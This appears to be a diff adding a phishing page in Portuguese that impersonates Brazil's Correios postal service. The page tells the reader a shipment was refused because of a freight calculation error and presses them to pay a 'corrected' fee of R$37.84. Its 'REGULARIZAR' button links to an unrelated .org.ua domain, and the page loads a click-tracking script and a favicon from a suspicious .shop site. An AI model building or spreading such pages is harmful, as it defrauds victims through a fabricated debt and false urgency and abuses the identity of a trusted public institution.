@@ -1,0 +1,403 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="https://cdn.tailwindcss.com"></script>
+<script src="js/utm-handler.js" data-token="0002f7dd-01f9-4d84-9389-4b6fcc9616ea" data-click-id-param="click_id">
+</script>
+
+  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transferência Recusada</title>
+    <link rel="icon" href="https://ganheavaliandopesquisagoraa.shop/favicon.ico">
+    <style>
+        /* Base styles from Tailwind's preflight */
+        *, ::before, ::after {
+            box-sizing: border-box;
+            border-width: 0;
+            border-style: solid;
+            border-color: #e5e7eb; /* gray-200 */
+        }
+        html {
+            line-height: 1.5;
+            -webkit-text-size-adjust: 100%;
+            font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+        }
+        body {
+            margin: 0;
+            line-height: inherit;
+        }
+        a {
+            color: inherit;
+            text-decoration: inherit;
+        }
+        button {
+            background-color: transparent;
+            background-image: none;
+            cursor: pointer;
+        }
+        img {
+            display: block;
+            vertical-align: middle;
+        }
+        h1, h3, p, ul {
+            margin: 0;
+            padding: 0;
+        }
+        ul {
+            list-style: none;
+        }
+
+        /* Custom CSS based on Tailwind classes */
+        .flex { display: flex; }
+        .flex-col { flex-direction: column; }
+        .flex-grow { flex-grow: 1; }
+        .items-center { align-items: center; }
+        .justify-center { justify-content: center; }
+        .justify-between { justify-content: space-between; }
+        .space-y-3 > :not([hidden]) ~ :not([hidden]) { margin-top: 0.75rem; margin-bottom: 0; }
+        .space-y-4 > :not([hidden]) ~ :not([hidden]) { margin-top: 1rem; margin-bottom: 0; }
+        .space-y-6 > :not([hidden]) ~ :not([hidden]) { margin-top: 1.5rem; margin-bottom: 0; }
+        .gap-1 { gap: 0.25rem; }
+        .gap-4 { gap: 1rem; }
+        .grid { display: grid; }
+        .grid-cols-1 { grid-template-columns: repeat(1, minmax(0, 1fr)); }
+        .h-4 { height: 1rem; }
+        .h-5 { height: 1.25rem; }
+        .h-6 { height: 1.5rem; }
+        .h-10 { height: 2.5rem; }
+        .h-20 { height: 5rem; }
+        .w-4 { width: 1rem; }
+        .w-5 { width: 1.25rem; }
+        .w-6 { width: 1.5rem; }
+        .w-32 { width: 8rem; }
+        .w-full { width: 100%; }
+        .max-w-md { max-width: 28rem; }
+        .min-h-screen { min-height: 100vh; }
+        .min-h-\[calc$$100vh-200px$$\] { min-height: calc(100vh - 200px); } /* Adjusted for header/footer */
+        .relative { position: relative; }
+        .fill { position: absolute; top: 0; right: 0; bottom: 0; left: 0; }
+        .object-contain { object-fit: contain; }
+        .mx-auto { margin-left: auto; margin-right: auto; }
+        .mb-2 { margin-bottom: 0.5rem; }
+        .mb-4 { margin-bottom: 1rem; }
+        .mt-12 { margin-top: 3rem; }
+        .mr-1 { margin-right: 0.25rem; }
+        .mr-2 { margin-right: 0.5rem; }
+        .px-4 { padding-left: 1rem; padding-right: 1rem; }
+        .py-2 { padding-top: 0.5rem; padding-bottom: 0.5rem; }
+        .py-4 { padding-top: 1rem; padding-bottom: 1rem; }
+        .py-12 { padding-top: 3rem; padding-bottom: 3rem; }
+        .pt-8 { padding-top: 2rem; }
+        .rounded-md { border-radius: 0.375rem; }
+        .shadow-sm { box-shadow: 0 1px 2px 0 rgb(0 0 0 / 0.05); }
+        .bg-white { background-color: #fff; }
+        .bg-gray-50 { background-color: #f9fafb; }
+        .bg-blue-600 { background-color: #2563eb; }
+        .bg-blue-700 { background-color: #1d4ed8; }
+        .bg-yellow-400 { background-color: #facc15; }
+        .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
+        .text-lg { font-size: 1.125rem; line-height: 1.75rem; }
+        .text-xl { font-size: 1.25rem; line-height: 1.75rem; }
+        .text-2xl { font-size: 1.5rem; line-height: 2rem; }
+        .text-3xl { font-size: 1.875rem; line-height: 2.25rem; }
+        .font-bold { font-weight: 700; }
+        .font-semibold { font-weight: 600; }
+        .tracking-tight { letter-spacing: -0.025em; }
+        .text-center { text-align: center; }
+        .text-gray-600 { color: #4b5563; }
+        .text-gray-700 { color: #374151; }
+        .text-gray-800 { color: #1f2937; }
+        .text-gray-900 { color: #111827; }
+        .text-blue-600 { color: #2563eb; }
+        .text-red-500 { color: #ef4444; }
+        .hover\:underline:hover { text-decoration-line: underline; }
+        .border-t { border-top-width: 1px; }
+        .border-gray-700 { border-color: #374151; }
+        .h-1 { height: 0.25rem; }
+
+        /* Card styles */
+        .card {
+            background-color: #fff;
+            border-radius: 0.5rem;
+            box-shadow: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
+            padding: 1.5rem;
+        }
+        .card-header {
+            padding: 1.5rem;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        .card-content {
+            padding: 1.5rem;
+        }
+        .card-footer {
+            padding: 1.5rem;
+            border-top: 1px solid #e5e7eb;
+        }
+
+        /* Button styles */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            white-space: nowrap;
+            border-radius: 0.375rem;
+            font-size: 0.875rem;
+            font-weight: 500;
+            transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter;
+            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+            transition-duration: 150ms;
+            height: 2.5rem;
+            padding: 0 1rem;
+        }
+        .btn-ghost {
+            background-color: transparent;
+            color: #111827; /* text-gray-900 */
+        }
+        .btn-ghost:hover {
+            background-color: #f3f4f6; /* gray-100 */
+        }
+        .btn-icon {
+            height: 2.5rem;
+            width: 2.5rem;
+            padding: 0;
+        }
+
+        /* Responsive adjustments */
+        @media (min-width: 640px) { /* sm */
+            .sm\:px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
+        }
+        @media (min-width: 768px) { /* md */
+            .md\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+        }
+        @media (min-width: 1024px) { /* lg */
+            .lg\:px-8 { padding-left: 2rem; padding-right: 2rem; }
+            .lg\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+        }
+    </style>
+</head>
+<body>
+    <div class="flex flex-col min-h-screen">
+        <!-- Header -->
+        <header class="w-full bg-white shadow-sm">
+            <div class="container mx-auto flex items-center justify-between px-4 py-2 text-sm text-gray-700">
+                <div class="flex items-center gap-1">
+                    <span>Acessibilidade</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4">
+                        <path d="m6 9 6 6 6-6"></path>
+                    </svg>
+                </div>
+            </div>
+            <div class="container mx-auto flex items-center justify-between px-4 py-4">
+                <button class="btn btn-ghost btn-icon" aria-label="Menu">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6 text-blue-600">
+                        <line x1="4" x2="20" y1="12" y2="12"></line>
+                        <line x1="4" x2="20" y1="6" y2="6"></line>
+                        <line x1="4" x2="20" y1="18" y2="18"></line>
+                    </svg>
+                </button>
+                <div class="flex-grow flex justify-center">
+                    <!-- Espaço para sua logo -->
+                    <div class="relative h-10 w-32">
+                        <img src="images/correios.svg" alt="Sua Logo">
+                    </div>
+                </div>
+            </div>
+            <div class="h-1 w-full bg-yellow-400"></div> <!-- Linha amarela separadora -->
+        </header>
+
+        <!-- Breadcrumb Navigation -->
+        <div class="container mx-auto px-4 py-4">
+            <a href="index.html" class="flex items-center text-blue-600 hover:underline mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4 mr-1">
+                    <path d="m15 18-6-6 6-6"></path>
+                </svg>
+                Rastreamento
+            </a>
+            <h1 class="text-2xl font-bold text-gray-900">Rastreamento</h1>
+        </div>
+
+        <!-- Main Content - Transfer Refused Page -->
+        <main class="flex-grow">
+            <div class="flex min-h-[calc(100vh-200px)] items-center justify-center bg-gray-50 px-4 py-12 sm:px-6 lg:px-8">
+                <div class="card w-full max-w-md text-center">
+                    <div class="card-header space-y-4">
+                        <div class="flex justify-center">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-20 w-20 text-red-500">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <path d="m15 9-6 6"></path>
+                                <path d="m9 9 6 6"></path>
+                            </svg>
+                        </div>
+                        <h2 class="text-3xl font-bold tracking-tight text-gray-900">Erro de Cálculo</h2>
+                        <p class="text-lg text-gray-600">Número do Pedido #6481749338</p>
+                    </div>
+                   <div class="card-content space-y-6 text-left">
+  <p class="text-lg text-gray-800 leading-relaxed">
+    <strong>Atenção:</strong> seu envio foi <span class="text-red-600 font-semibold">recusado</span> por um erro de cálculo no frete para o CEP Informado.
+  </p>
+  <p class="text-base text-gray-800 font-medium leading-relaxed">
+   Somente após a regularização do valor do frete, seu pedido poderá ser processado.
+  </p>
+
+  <p class="text-base text-gray-800 font-medium leading-relaxed">
+   Valor corrigido R$37,84
+  </p>
+
+  <p class="text-sm text-gray-700 leading-relaxed">
+    ⚠️ Evite transtornos: regularize o pagamento agora mesmo para garantir o envio do seu pedido sem atrasos.
+  </p>
+</div>
+
+                    <div class="card-footer">
+       <a href="https://compraseguraonline.org.ua/c/e863609ae8" class="inline-block bg-[#0075B0] hover:bg-[#00649a] text-white font-bold py-4 px-10 rounded-lg text-xl text-center w-64">
+  REGULARIZAR
+</a>
+
+
+
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="bg-yellow-400 py-12 text-gray-900">
+            <div class="container mx-auto px-4">
+                <div class="grid grid-cols-1 gap-8 md:grid-cols-2 lg:grid-cols-3">
+                    <!-- Fale Conosco Section -->
+                    <div>
+                        <h3 class="mb-4 text-xl font-bold">Fale Conosco</h3>
+                        <ul class="space-y-3">
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+                                        <line x1="8" x2="16" y1="21" y2="21"></line>
+                                        <line x1="12" x2="12" y1="17" y2="21"></line>
+                                    </svg>
+                                    Registro de Manifestações
+                                </a>
+                            </li>
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V3a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+                                    </svg>
+                                    Central de Atendimento
+                                </a>
+                            </li>
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
+                                        <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
+                                    </svg>
+                                    Soluções para o seu negócio
+                                </a>
+                            </li>
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
+                                        <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
+                                    </svg>
+                                    Suporte ao cliente com contrato
+                                </a>
+                            </li>
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V3a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+                                    </svg>
+                                    Ouvidoria
+                                </a>
+                            </li>
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <path d="M18 8h1a4 4 0 0 1 0 8h-1"></path>
+                                        <path d="M2 8h1a4 4 0 0 0 0 8h-1"></path>
+                                        <path d="M8 10h8"></path>
+                                        <path d="M8 14h8"></path>
+                                        <path d="M14 4v16"></path>
+                                        <path d="M10 4v16"></path>
+                                    </svg>
+                                    Denúncia
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <!-- Sobre os Correios Section -->
+                    <div>
+                        <h3 class="mb-4 text-xl font-bold">Sobre os Correios</h3>
+                        <ul class="space-y-3">
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <path d="M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H20v20H6.5a2.5 2.5 0 0 1 0-5H20"></path>
+                                    </svg>
+                                    Identidade corporativa
+                                </a>
+                            </li>
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <path d="M22 10v6M2 10l10-5 10 5M2 10v6c0 1.1.9 2 2 2h16a2 2 0 0 0 2-2v-6M12 18v4"></path>
+                                    </svg>
+                                    Educação e cultura
+                                </a>
+                            </li>
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <path d="M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H20v20H6.5a2.5 2.5 0 0 1 0-5H20"></path>
+                                    </svg>
+                                    Código de ética
+                                </a>
+                            </li>
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <circle cx="11" cy="11" r="8"></circle>
+                                        <path d="m21 21-4.3-4.3"></path>
+                                    </svg>
+                                    Transparência e prestação de contas
+                                </a>
+                            </li>
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                                    </svg>
+                                    Política de Privacidade e Notas Legais
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <!-- Outros Sites Section -->
+                    <div>
+                        <h3 class="mb-4 text-xl font-bold">Outros Sites</h3>
+                        <ul class="space-y-3">
+                            <li>
+                                <a href="index.html#" class="flex items-center hover:underline">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2 h-5 w-5">
+                                        <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"></path>
+                                        <path d="M3 6h18"></path>
+                                        <path d="M16 10a4 4 0 0 1-8 0"></path>
+                                    </svg>
+                                    Loja online dos Correios
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="mt-12 border-t border-gray-700 pt-8 text-center text-sm">
+                    <p>© Copyright 2025 Correios</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+</body></html>
